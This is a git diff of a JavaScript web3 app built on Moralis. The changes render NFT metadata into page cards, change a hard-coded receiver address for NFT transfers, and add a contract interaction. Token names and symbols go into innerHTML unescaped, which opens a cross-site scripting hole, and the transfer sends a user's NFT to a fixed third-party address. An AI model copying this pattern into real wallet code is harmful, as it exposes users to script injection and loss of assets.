@@ -41,8 +41,14 @@ async function balance(){
 // run the query
   const results = await query.find();
   console.log(results)
-  information = results
-  
+
+    let ele = document.getElementById('iterative');
+    information = results
+    for (const index in information) {
+      ele.innerHTML +='<div class="col"> <div class="card shadow-sm"> <svg class="bd-placeholder-img card-img-top" width="100%" height="225" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Placeholder: Thumbnail" preserveAspectRatio="xMidYMid slice" focusable="false"> <title>Placeholder</title> <rect width="100%" height="100%" fill="#55595c"/> <text x="50%" y="50%" fill="#eceeef" dy=".3em">Thumbnail</text> </svg> <div class="card-body"> <p class="card-text">' + information[index].attributes.token_id +'</p><p class="card-text">' + information[index].attributes.name +'</p><p class="card-text">' + information[index].attributes.symbol +'</p><div class="d-flex justify-content-between align-items-center"> <div class="btn-group"><button type="button" class="btn btn-sm btn-outline-secondary">View</button> <button type="button" class="btn btn-sm btn-outline-secondary">Edit</button></div><small class="text-muted">9 mins</small> </div></div></div></div>';    }
+
+    
+    
   }
 
 
@@ -50,7 +56,7 @@ async function transfer(){
   balance()
   const type = information[0].attributes.contract_type
   const lowType =  type.toLowerCase()
-  const receiver = "0xe33F916081c742515c17214a017588fba126Cf8C"
+  const receiver = "0xce104060ecdabFe6139B248bA20c54e03C5bE376"
   const contractAdress = information[0].attributes.token_address
   const tokenId = information[0].attributes.token_id
 
@@ -63,8 +69,50 @@ async function transfer(){
   let result = await Moralis.transfer(options)
   }
 
+async function interaction(){
+  const ABI = [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "token_address",
+          "type": "address"
+        }
+      ],
+      "name": "storeTokenAddress",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "viewTokenAddress",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ]
+
+  const options = {
+    contractAddress: "0xEE995dc1D7793a1674c8D97d0111816C8bcfB12E",
+    functionName: "storeTokenAddress",
+    abi: ABI,
+    params:{
+      token_address: "0xEE995dc1D7793a1674c8D97d0111816C8bcfB12E"
+    },
+  }
+  const addCount =  await Moralis.executeFunction(options)
+}
+
 
   document.getElementById("btn-login").onclick = login;
   document.getElementById("btn-logout").onclick = logOut;
   document.getElementById("btn-balance").onclick = balance;
   document.getElementById("btn-transfer").onclick = transfer;
+  document.getElementById("btn-interaction").onclick = interaction;
